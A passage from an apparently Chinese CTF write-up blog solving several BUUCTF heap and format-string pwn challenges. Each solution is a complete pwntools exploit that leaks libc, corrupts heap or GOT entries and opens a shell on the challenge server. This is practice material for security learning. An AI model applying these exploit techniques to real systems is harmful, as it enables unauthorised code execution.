class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; Now please tell me what you want to do :&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; SCP project ID : &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x60</span>, <span class="number">0x60</span>, <span class="string">b&#x27;a\n&#x27;</span>, <span class="string">b&#x27;a\n&#x27;</span>)		<span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="number">0x60</span>, <span class="string">b&#x27;a\n&#x27;</span>, <span class="string">b&#x27;a\n&#x27;</span>)		<span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x6020A8</span>), <span class="string">b&#x27;a&#x27;</span>)	<span class="comment"># 2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">io.recvuntil(b&#x27;Banana\&#x27;s ba is &#x27;)</span></span><br><span class="line"><span class="string">puts = u64(io.recv(6) + b&#x27;\x00\x00&#x27;)</span></span><br><span class="line"><span class="string">log.info(&#x27;puts: &#x27; + hex(puts))</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;, puts)</span></span><br><span class="line"><span class="string">base = puts - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">__malloc_hook = base + libc.dump(&#x27;__malloc_hook&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="string">base = puts - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system = base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">__malloc_hook = base + libc.symbols[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">io.recvuntil(&#x27;Banana\&#x27;s na is &#x27;)</span></span><br><span class="line"><span class="string">heap_addr = u64(io.recvuntil(b&#x27;\n&#x27;, drop=True).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">log.info(&#x27;system: &#x27; + hex(system))</span></span><br><span class="line"><span class="string">log.info(&#x27;heap addr: &#x27; + hex(heap_addr))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x60, 0x60, b&#x27;a\n&#x27;, b&#x27;a\n&#x27;)		# 3</span></span><br><span class="line"><span class="string">add(0x60, 0x60, b&#x27;a\n&#x27;, b&#x27;a\n&#x27;)		# 4</span></span><br><span class="line"><span class="string">delete(3)</span></span><br><span class="line"><span class="string">delete(4)</span></span><br><span class="line"><span class="string">add(0x18, 0x18, p64(heap_addr + 0x10) + p64(heap_addr + 0x110), b&#x27;b&#x27;)	# 5</span></span><br><span class="line"><span class="string">add(0x60, 0x60, b&#x27;a\n&#x27;, b&#x27;a\n&#x27;)		# 6</span></span><br><span class="line"><span class="string">delete(6)</span></span><br><span class="line"><span class="string">delete(3)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x60, 0x60, b&#x27;a\n&#x27;, p64(__malloc_hook - 0x23))	# 7</span></span><br><span class="line"><span class="string">add(0x60, 0x60, b&#x27;a\n&#x27;, b&#x27;a\n&#x27;)	# 8</span></span><br><span class="line"><span class="string">add(0x60, 0x50, b&#x27;b&#x27; * 19 + p64(one_gadgets[3]), b&#x27;/bin/sh\n&#x27;)	# 9</span></span><br><span class="line"><span class="string"># add(0x18, 0x18, b&#x27;a\n&#x27;, p64(system))</span></span><br><span class="line"><span class="string"># delete(7)</span></span><br><span class="line"><span class="string"># gdb.attach(io, &#x27;b *0x400C24&#x27;)</span></span><br><span class="line"><span class="string"># time.sleep(3)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="buu097-axb_2019_heap"><a class="markdownIt-Anchor" href="#buu097-axb_2019_heap"></a> buu097-axb_2019_heap</h1>
<p>这题的漏洞在于输入的时候会溢出1个字节，因此自然就可以想到使用unlink的方法来做。但这道题有一个很坑的点就是不能用LibcSearcher，虽然它能给你查到2个libc，但是无论你用哪个，远程都打不通，报错，但是用buuoj提供的64位的2.23 glibc就行，这个点坑了我好几个小时才发现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29678</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Enter the index you want to create (0-10):&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;Enter a size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;Enter the content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Enter an index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Enter an index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;Enter the content: \n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter your name: &#x27;</span>, <span class="string">b&#x27;%15$p%19$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">elf_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x116A</span></span><br><span class="line">note_addr = elf_addr + <span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;__libc_start_main: &#x27;</span> + <span class="built_in">hex</span>(__libc_start_main))</span><br><span class="line">log.info(<span class="string">&#x27;elf base: &#x27;</span> + <span class="built_in">hex</span>(elf_addr))</span><br><span class="line"></span><br><span class="line">libc_base = __libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x98</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xA0</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x10</span>) + p64(<span class="number">0x91</span>) + p64(note_addr - <span class="number">0x18</span>) + p64(note_addr - <span class="number">0x10</span>) + cyclic(<span class="number">0x70</span>) + p64(<span class="number">0x90</span>) + <span class="string">b&#x27;\xB0&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(__free_hook) + p64(<span class="number">0x38</span>) + p64(note_addr + <span class="number">0x18</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu098-oneshot_tjctf_2016"><a class="markdownIt-Anchor" href="#buu098-oneshot_tjctf_2016"></a> buu098-oneshot_tjctf_2016</h1>
<p>第一次输出got表地址，然后获取libc地址，跳转到one_gadget即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27336</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Read location?\n&#x27;</span>, <span class="built_in">str</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>]).encode())</span><br><span class="line">ru(<span class="string">b&#x27;Value: 0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(rud(<span class="string">b&#x27;\n&#x27;</span>), <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Jump location?\n&#x27;</span>, <span class="built_in">str</span>(one_gadgets[<span class="number">3</span>] + libc_base).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu099-护网杯_2018_gettingstart"><a class="markdownIt-Anchor" href="#buu099-护网杯_2018_gettingstart"></a> buu099-护网杯_2018_gettingstart</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29278</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;But Whether it starts depends on you.\n&#x27;</span>, cyclic(<span class="number">0x18</span>) + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3FB999999999999A</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu100-wustctf2020_number_game"><a class="markdownIt-Anchor" href="#buu100-wustctf2020_number_game"></a> buu100-wustctf2020_number_game</h1>
<p>计算机组成原理的知识……对于32位整数而言，只有0x80000000这个数（-2147483648）取相反数的值为2147483648，还是0x80000000，所以表示的数不变。输入这个数就行了。</p>
<h1 id="buu101-zctf2016_note2"><a class="markdownIt-Anchor" href="#buu101-zctf2016_note2"></a> buu101-zctf2016_note2</h1>
<p>这道题提供了4个选项：增加、删除、修改、查看。其中修改能够提供2种选项——追加和覆写。修改部分的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *tempbuf; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( put_limit )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v1 = input_int();</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = ptr[v1];</span><br><span class="line">      size = sizes[v1];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v2 = input_int();</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span class="number">1</span> || v2 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">          tempbuf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0xA0</span>uLL);</span><br><span class="line">          <span class="built_in">strcpy</span>(tempbuf, <span class="string">&quot;TheNewContents:&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(tempbuf);</span><br><span class="line">          input(tempbuf + <span class="number">15</span>, <span class="number">0x90</span>LL, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">          parse(tempbuf + <span class="number">15</span>);</span><br><span class="line">          v0 = tempbuf;</span><br><span class="line">          v0[size - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, tempbuf + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL);</span><br><span class="line">          <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">          <span class="built_in">free</span>(tempbuf);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Edit note success!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Error choice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;note has been deleted&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please add a note!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意其中的<code>strncat</code>函数，其第3个参数是字符串拼接之后的最大长度，虽然这里传的是最大的无符号整数，但是并不意味着这里可以溢出，因为前面还有一个<code>v0[size - strlen(dest) + 14] = 0;</code>将要追加的内容截断了，因此漏洞点不在这里。</p>
<p>经过测试发现，在glibc 2.23版本中，<code>malloc(0)</code>会创建一个大小为0x20的chunk，此时我们的重点就放在了输入的函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">input</span><span class="params">(<span class="type">char</span> *buffer, __int64 maxsize, <span class="type">char</span> endchar)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; maxsize - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == endchar )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buffer[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  buffer[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意循环是<code>for ( i = 0LL; maxsize - 1 &gt; i; ++i )</code>，查看汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A28 loc_400A28:                             ; CODE XREF: input+1D↑j</span><br><span class="line">.text:0000000000400A28                 mov     rax, [rbp+var_30]</span><br><span class="line">.text:0000000000400A2C                 sub     rax, 1</span><br><span class="line">.text:0000000000400A30                 cmp     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400A34                 ja      short loc_4009DC</span><br></pre></td></tr></table></figure>
<p>这里是ja指令，因此是无符号的比较，但如果传入的size为0的话，那么这里就相当于是溢出任意多个字节。</p>
<p>既然有这样一个漏洞，在2.23环境很容易想到unlink，毕竟本题elf没加PIE，我们知道堆地址是保存在什么地方的，因此unlink最方便。</p>
<p>我的做法是覆盖atoi的got表地址为system，然后在输出菜单之后直接输入<code>/bin/sh</code>即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28072</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">ita = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Input the length of the note content:(less than 128)&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;Input the note content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, option, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;do you want to overwrite or append?[1.overwrite/2.append]&#x27;</span>, <span class="built_in">str</span>(option).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;TheNewContents:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Input your name:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Input your address:&#x27;</span>, 